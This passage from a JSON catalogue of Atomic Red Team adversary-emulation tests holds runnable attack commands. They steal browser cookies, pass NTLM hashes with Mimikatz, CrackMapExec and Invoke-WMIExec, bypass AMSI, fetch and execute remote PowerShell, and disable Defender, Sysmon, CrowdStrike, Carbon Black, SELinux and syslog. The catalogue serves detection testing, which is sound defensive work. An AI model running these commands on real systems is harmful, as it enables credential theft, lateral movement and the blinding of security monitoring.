			"command": "DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n",
			"cleanup_command": "kill `pgrep Calculator`\nkill `pgrep firefox`\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1574.006",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Steal Firefox Cookies (Windows)",
		"auto_generated_guid": "4b437357-f4e9-4c84-9fa6-9bcee6f826aa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sqlite3_path": {
				"description": "Path to sqlite3",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
			},
			"output_file": {
				"description": "Filepath to output cookies",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sqlite3 must exist at (#{sqlite3_path})\n",
				"prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"
			}
		],
		"executor": {
			"command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\"\n",
			"cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1539",
		"phases": ["credential-access"]
	},
	{
		"name": "Steal Chrome Cookies (Windows)",
		"auto_generated_guid": "26a6b840-4943-4965-8df5-ef1f9a282440",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"cookie_db": {
				"description": "Filepath for Chrome cookies database",
				"type": "string",
				"default": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
			},
			"sqlite3_path": {
				"description": "Path to sqlite3",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
			},
			"output_file": {
				"description": "Filepath to output cookies",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sqlite3 must exist at (#{sqlite3_path})\n",
				"prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"
			}
		],
		"executor": {
			"command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n",
			"cleanup_command": "remove-item #{output_file}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1539",
		"phases": ["credential-access"]
	},
	{
		"name": "Steal Chrome Cookies via Remote Debugging (Mac)",
		"auto_generated_guid": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072",
		"supported_platforms": ["macos"],
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Install Go",
				"prereq_command": "go version",
				"get_prereq_command": "brew install go"
			},
			{
				"description": "Download and compile WhiteChocolateMacademiaNut",
				"prereq_command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
				"get_prereq_command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build"
			}
		],
		"executor": {
			"command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",
			"cleanup_command": "rm -rf /tmp/WhiteChocolateMacademiaNut",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1539",
		"phases": ["credential-access"]
	},
	{
		"name": "Mimikatz Pass the Hash",
		"auto_generated_guid": "ec23cef9-27d9-46e4-a68d-6f75f7b86908",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_name": {
				"description": "username",
				"type": "string",
				"default": "Administrator"
			},
			"ntlm": {
				"description": "ntlm hash",
				"type": "string",
				"default": "cc36cf7a8514893efccd3324464tkg1a"
			},
			"domain": {
				"description": "domain",
				"type": "string",
				"default": "%userdnsdomain%"
			},
			"mimikatz_path": {
				"description": "mimikatz windows executable",
				"type": "path",
				"default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1550.002",
		"phases": ["defense-evasion", "lateral-movement"]
	},
	{
		"name": "crackmapexec Pass the Hash",
		"auto_generated_guid": "eb05b028-16c8-4ad8-adea-6f5b219da9a9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_name": {
				"description": "username",
				"type": "string",
				"default": "Administrator"
			},
			"crackmapexec_exe": {
				"description": "crackmapexec windows executable",
				"type": "path",
				"default": "C:\\CrackMapExecWin\\crackmapexec.exe"
			},
			"command": {
				"description": "command to execute",
				"type": "string",
				"default": "whoami"
			},
			"ntlm": {
				"description": "command",
				"type": "string",
				"default": "cc36cf7a8514893efccd3324464tkg1a"
			},
			"domain": {
				"description": "domain",
				"type": "string",
				"default": "%userdnsdomain%"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
				"prereq_command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n"
			}
		],
		"executor": {
			"command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1550.002",
		"phases": ["defense-evasion", "lateral-movement"]
	},
	{
		"name": "Invoke-WMIExec Pass the Hash",
		"auto_generated_guid": "f8757545-b00a-4e4e-8cfb-8cfb961ee713",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ntlm": {
				"description": "ntlm hash",
				"type": "string",
				"default": "cc36cf7a8514893efccd3324464tkg1a"
			},
			"user_name": {
				"description": "username",
				"type": "string",
				"default": "Administrator"
			},
			"command": {
				"description": "Command to run on target system",
				"type": "string",
				"default": "hostname"
			},
			"target": {
				"description": "System to run command on",
				"type": "string",
				"default": "$env:COMPUTERNAME"
			}
		},
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1550.002",
		"phases": ["defense-evasion", "lateral-movement"]
	},
	{
		"name": "Disable syslog",
		"auto_generated_guid": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"package_checker": {
				"description": "Package checking command for linux.",
				"type": "string",
				"default": "(rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed)"
			},
			"package_installer": {
				"description": "Package installer command for linux. Default yum",
				"type": "string",
				"default": "(which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)"
			},
			"flavor_command": {
				"description": "Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog",
				"type": "string",
				"default": "systemctl stop rsyslog ; systemctl disable rsyslog"
			},
			"cleanup_command": {
				"description": "Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on",
				"type": "string",
				"default": "systemctl start rsyslog ; systemctl enable rsyslog"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Package with rsyslog must be on system\n",
				"prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "sudo #{package_installer} \n"
			}
		],
		"executor": {
			"command": "#{flavor_command}\n",
			"cleanup_command": "#{cleanup_command}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable syslog (freebsd)",
		"auto_generated_guid": "db9de996-441e-4ae0-947b-61b6871e2fdf",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "service syslogd stop\nsysrc syslogd_enable=\"NO\"\n",
			"cleanup_command": "sysrc syslogd_enable=\"YES\"\nservice syslogd start\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Cb Response",
		"auto_generated_guid": "ae8943f7-0f8d-44de-962d-fbc2e2f03eb8",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable SELinux",
		"auto_generated_guid": "fc225f36-9279-4c39-b3f9-5141ab74f8d8",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "SELinux must be installed\n",
				"prereq_command": "which setenforce\n",
				"get_prereq_command": "echo \"SELinux is not installed\"; exit 1\n"
			}
		],
		"executor": {
			"command": "setenforce 0\n",
			"cleanup_command": "setenforce 1\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Stop Crowdstrike Falcon on Linux",
		"auto_generated_guid": "828a1278-81cc-4802-96ab-188bf29ca77d",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n",
			"cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Carbon Black Response",
		"auto_generated_guid": "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n",
			"cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable LittleSnitch",
		"auto_generated_guid": "62155dd8-bb3d-4f32-b31c-6532ff3ac6a3",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
			"cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable OpenDNS Umbrella",
		"auto_generated_guid": "07f43b33-1e15-4e99-be70-bc094157c849",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
			"cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable macOS Gatekeeper",
		"auto_generated_guid": "2a821573-fb3f-4e71-92c3-daac7432f053",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo spctl --master-disable\n",
			"cleanup_command": "sudo spctl --master-enable\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Stop and unload Crowdstrike Falcon on macOS",
		"auto_generated_guid": "b3e7510c-2d4c-4249-a33f-591a2bc83eef",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"falcond_plist": {
				"description": "The path of the Crowdstrike Falcon plist file",
				"type": "path",
				"default": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
			},
			"userdaemon_plist": {
				"description": "The path of the Crowdstrike Userdaemon plist file",
				"type": "path",
				"default": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
			}
		},
		"executor": {
			"command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n",
			"cleanup_command": "sudo launchctl load -w #{falcond_plist}\nsudo launchctl load -w #{userdaemon_plist}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Unload Sysmon Filter Driver",
		"auto_generated_guid": "811b3e76-c41b-430c-ac0d-e2380bfaa164",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sysmon_driver": {
				"description": "The name of the Sysmon filter driver (this can change from the default)",
				"type": "string",
				"default": "SysmonDrv"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sysmon must be downloaded\n",
				"prereq_command": "if ((cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr /i Sysmon 2> nul\") -or (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\")) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\" -Force\n"
			},
			{
				"description": "sysmon must be Installed\n",
				"prereq_command": "if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "if(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i}\n"
			},
			{
				"description": "sysmon filter must be loaded\n",
				"prereq_command": "if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "if(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\"){\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula -i\n}\n"
			}
		],
		"executor": {
			"command": "fltmc.exe unload #{sysmon_driver}\n",
			"cleanup_command": "sysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i > nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Uninstall Sysmon",
		"auto_generated_guid": "a316fb2e-5344-470d-91c1-23e15c374edc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sysmon_exe": {
				"description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Sysmon executable must be available\n",
				"prereq_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}\n",
				"get_prereq_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n"
			},
			{
				"description": "Sysmon must be installed\n",
				"prereq_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}\n",
				"get_prereq_command": "cmd /c sysmon -i -accepteula\n"
			}
		],
		"executor": {
			"command": "sysmon -u\n",
			"cleanup_command": "sysmon -i -accepteula >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AMSI Bypass - AMSI InitFailed",
		"auto_generated_guid": "695eed40-e949-40e5-b306-b4031e4154bd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
			"cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AMSI Bypass - Remove AMSI Provider Reg Key",
		"auto_generated_guid": "13f09b91-c953-438e-845b-b585e51cac9b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
			"cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Arbitrary Security Windows Service",
		"auto_generated_guid": "a1230893-56ac-4c81-b644-2108e982f8f5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "The name of the service to stop",
				"type": "string",
				"default": "McAfeeDLPAgentService"
			}
		},
		"executor": {
			"command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n",
			"cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender ATP PowerShell",
		"auto_generated_guid": "6b8df440-51ec-4d53-bf83-899591c9b5d7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n",
			"cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Command Prompt",
		"auto_generated_guid": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n",
			"cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Registry",
		"auto_generated_guid": "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
			"cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Microsoft Office Security Features",
		"auto_generated_guid": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Remove Windows Defender Definition Files",
		"auto_generated_guid": "3d47daaa-2f56-43e0-94cc-caf5d8d52a68",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Stop and Remove Arbitrary Security Windows Service",
		"auto_generated_guid": "ae753dda-0f15-4af6-a168-b9ba16143143",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "The name of the service to remove",
				"type": "string",
				"default": "McAfeeDLPAgentService"
			}
		},
		"executor": {
			"command": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Uninstall Crowdstrike Falcon on Windows",
		"auto_generated_guid": "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"falcond_path": {
				"description": "The Crowdstrike Windows Sensor path. The Guid always changes.",
				"type": "path",
				"default": "C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"
			}
		},
		"executor": {
			"command": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Evade Scanning -Folder",
		"auto_generated_guid": "0b19f4ee-de90-4059-88cb-63c800c683ed",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"excluded_folder": {
				"description": "This folder will be excluded from scanning",
				"type": "path",
				"default": "C:\\Temp"
			}
		},
		"executor": {
			"command": "$excludedpath= \"#{excluded_folder}\"\nAdd-MpPreference -ExclusionPath $excludedpath",
			"cleanup_command": "$excludedpath= \"#{excluded_folder}\"\nRemove-MpPreference -ExclusionPath $excludedpath\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Evade Scanning -Extension",
		"auto_generated_guid": "315f4be6-2240-4552-b3e1-d1047f5eecea",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"excluded_exts": {
				"description": "A list of extension to exclude from scanning",
				"type": "string",
				"default": ".exe"
			}
		},
		"executor": {
			"command": "$excludedExts= \"#{excluded_exts}\"\nAdd-MpPreference -ExclusionExtension  $excludedExts",
			"cleanup_command": "$excludedExts= \"#{excluded_exts}\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tamper with Windows Defender Evade Scanning -Process",
		"auto_generated_guid": "a123ce6a-3916-45d6-ba9c-7d4081315c27",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"excluded_process": {
				"description": "A list of processes to exclude from scanning",
				"type": "string",
				"default": "outlook.exe"
			}
		},
		"executor": {
			"command": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess",
			"cleanup_command": "$excludedProcess = \"#{excluded_process}\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "office-365-Disable-AntiPhishRule",
		"auto_generated_guid": "b9bbae2c-2ba6-4cf3-b452-8e8f908696f3",
		"supported_platforms": ["office-365"],
		"input_arguments": {
			"username": {
				"description": "office-365 username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "office-365 password",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ExchangeOnlineManagement PowerShell module must be installed\n",
